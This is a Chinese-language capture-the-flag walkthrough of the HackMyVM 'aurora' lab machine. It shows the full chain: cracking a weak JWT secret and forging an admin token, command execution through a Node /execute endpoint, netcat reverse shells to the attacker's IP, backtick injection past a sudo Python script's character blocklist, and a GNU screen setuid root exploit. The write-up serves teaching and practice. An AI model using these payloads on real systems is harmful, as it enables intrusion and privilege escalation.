# hmv_aurora

# 0.简介

**靶机**：[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
Nmap scan report for 192.168.205.138
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

**3000**大概率是**web**页面

# 2.踩点

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>

```

禁止`GET`访问，那我们就`POST`

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u "http://192.168.205.138:3000" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
401     POST        1l        2w       22c http://192.168.205.138:3000/login
400     POST        1l        6w       29c http://192.168.205.138:3000/register
401     POST        1l        2w       22c http://192.168.205.138:3000/Login
400     POST        1l        6w       29c http://192.168.205.138:3000/Register
401     POST        1l        1w       12c http://192.168.205.138:3000/execute

```

使用`curl`访问

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/login -X POST
Identifiants invalides                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST
The "role" field is not valid                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST 
Unauthorized                                                                                                                                    

```

我们注册一个用户试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"admin\"}"
Not authorized !
```

啊这，丢去`WFUZZ`爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u "http://192.168.205.138:3000/register" -X POST -H "Content-Type: application/json" -d "{\"role\":\"FUZZ\"}" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/register
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   401        0 L      3 W        16 Ch       "admin"                                                             
000000022:   500        0 L      5 W        32 Ch       "user"                                                              

Total time: 58.91045
Processed Requests: 62284
Filtered Requests: 62282
Requests/sec.: 1057.265

```

继续注册

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\"}" 
Column 'username' cannot be null                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\",\"username\":\"xxoo\"}"
Column 'password' cannot be null                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\",\"username\":\"xxoo\",\"password\":\"xxoo\"}"
Registration OK                                                                                                                                     
```

去登录试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/login -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\",\"username\":\"xxoo\",\"password\":\"xxoo\"}"
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA"}
```

这很`jwt`，去尝试解码，[网站](https://jwt.io/)

![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)

将密钥爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' > hash
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)   
1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

改一下参数

![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)

尝试一下那个`execute`

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError [ERR_INVALID_ARG_TYPE]: The &quot;file&quot; argument must be of type string. Received undefined<br> &nbsp; &nbsp;at validateString (internal/validators.js:120:11)<br> &nbsp; &nbsp;at normalizeSpawnArguments (child_process.js:411:3)<br> &nbsp; &nbsp;at spawn (child_process.js:547:16)<br> &nbsp; &nbsp;at Object.execFile (child_process.js:237:17)<br> &nbsp; &nbsp;at exec (child_process.js:158:25)<br> &nbsp; &nbsp;at /opt/login-app/app.js:69:3<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at /opt/login-app/app.js:112:5<br> &nbsp; &nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12</pre>
</body>
</html>

```

`Authorization` 头以 `Bearer` 开头。报错了，提示 "`file` 参数应该是一个字符串，接收到了 `undefined`"。根据它的名字和报错我们可以猜出该网页应该是用来执行命令的，我们`wfuzz`一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u "http://192.168.205.138:3000/execute" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk" -d "{\"FUZZ\":\"id\"}" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 63
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/execute
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000008958:   200        1 L      3 W        54 Ch       "command"                                                           
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 19.47640
Processed Requests: 13025
Filtered Requests: 13024
Requests/sec.: 668.7578

```

尝试执行一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk" -d '{"command":"id"}'  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

弹个shell回来

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk" -d '{"command":"nc 192.168.205.141 8888 -e /bin/bash"}' 
```

卡住了，卡住就对了

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888          
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 43824
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@aurora:~$ ls -la
total 124
drwxr-xr-x   3 www-data www-data  4096 Apr  6  2023 .
drwxr-xr-x   3 root     root      4096 Mar  1  2023 ..
-rw-r--r--   1 www-data www-data  3271 Mar  1  2023 app.js
-rw-r--r--   1 www-data www-data  3169 Mar  2  2023 app.js.save
-rw-------   1 www-data www-data   153 Apr  6  2023 .bash_history
drwxr-xr-x 127 www-data www-data  4096 Mar  1  2023 node_modules
-rw-r--r--   1 www-data www-data   399 Mar  1  2023 package.json
-rw-r--r--   1 www-data www-data 95944 Mar  1  2023 package-lock.json
www-data@aurora:~$ cat .bash_history
clear
cd /home/doro/
clear
sudo -l
/usr/bin/python3 /home/doro/tools.py --ping
sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
clear
crontab -l
www-data@aurora:~$ sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
www-data@aurora:~$ cat /home/doro/tools.py
import os
import sys

def main():
    if len(sys.argv) < 2:
        print_help()
        return
  
    option = sys.argv[1]
    if option == "--ping":
        ping()
    elif option == "--traceroute":
        traceroute_ip()
    else:
        print("Invalid option.")
        print_help()

def print_help():
    print("Usage: python3 network_tool.py <option>")
    print("Options:")
    print("--ping           Ping an IP address")
    print("--traceroute     Perform a traceroute on an IP address")

def ping():
    ip_address = input("Enter an IP address: ")

    forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
    for char in forbidden_chars:
        if char in ip_address:
            print("Forbidden character found: {}".format(char))
            sys.exit(1)
  
    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input("Enter an IP address: ")

    if not is_valid_ip(ip_address):
        print("Invalid IP address.")
        return
  
    traceroute_command = "traceroute {}".format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split(".")
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:
            return False
    return True

if __name__ == "__main__":
    main()
www-data@aurora:~$ ls -la /home/doro/
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt

```

我们尝试一下代码注入，需要注意他禁用了`&`, `;`, `(`, `)`, `||`, `|`, `>`, `<`, `*`, `?`

```bash
www-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `id`
ping: groups=1000(doro): Name or service not known
```

执行成功，尝试弹shell

```bash
www-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `nc 192.168.205.141 8888 -e /bin/bash` 
```

成功弹了回来

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 57096
id
uid=1000(doro) gid=1000(doro) groups=1000(doro)

```

触发一下稳定 Shell小连招

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

继续提权

```bash
doro@aurora:~$ id
uid=1000(doro) gid=1000(doro) groups=1000(doro)
doro@aurora:~$ sudo -l
[sudo] password for doro: 
sudo: a password is required
doro@aurora:~$ cd /home/doro/
doro@aurora:~$ ls -al
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt
doro@aurora:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/screen
/usr/bin/sudo
/usr/bin/umount

```

`/usr/bin/screen`这个没见过，看看能不能提权。找到一篇[文章](https://www.exploit-db.com/exploits/41154)，还是利用脚本，更开心了

```bash
doro@aurora:/tmp$ vi screenroot.sh
doro@aurora:/tmp$ chmod +x screenroot.sh 
doro@aurora:/tmp$ bash screenroot.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-doro.

# id
uid=0(root) gid=0(root) groups=0(root),1000(doro)

```

成功提权